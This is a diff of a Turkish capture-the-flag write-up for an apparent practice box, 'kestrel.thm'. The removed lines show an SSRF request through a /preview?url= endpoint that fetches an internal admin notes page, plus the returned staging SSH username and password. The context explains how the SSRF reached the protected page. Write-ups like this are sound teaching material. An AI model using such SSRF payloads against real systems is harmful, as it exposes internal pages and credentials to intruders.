@@ -73,22 +73,6 @@ Daha önce `app.py` kaynak kodundan öğrendiğim `/opt/voltlabs-preview/admin_n
 http://kestrel.thm/admin/notes
 ```
 
-**Preview** butonuna bastığımda istek şu şekilde gönderildi:
-
-```
-http://kestrel.thm/preview?url=http%3A%2F%2Fkestrel.thm%2Fadmin%2Fnotes
-```
-
-Sunucu, benim adıma bu URL'ye istek atıp sonucu bana geri döndürdü. Karşıma dahili bir not çıktı:
-
-```
-=== INTERNAL ===
-SSH access for staging:
-  user: webdev
-  pass: V0ltLabs#summer
-- Mara
-```
-
 <img width="1919" height="503" alt="site2" src="https://github.com/user-attachments/assets/e16385f3-afa6-4158-ab60-621e951c1941" />
 
 Yani `/admin/notes` sayfası doğrudan dışarıdan korunuyor olabilirdi, ama SSRF açığı sayesinde uygulamanın **kendi üzerinden** bu içeriğe ulaşabildim. Not, doğrudan bana **staging ortamı için SSH kimlik bilgilerini** vermişti.
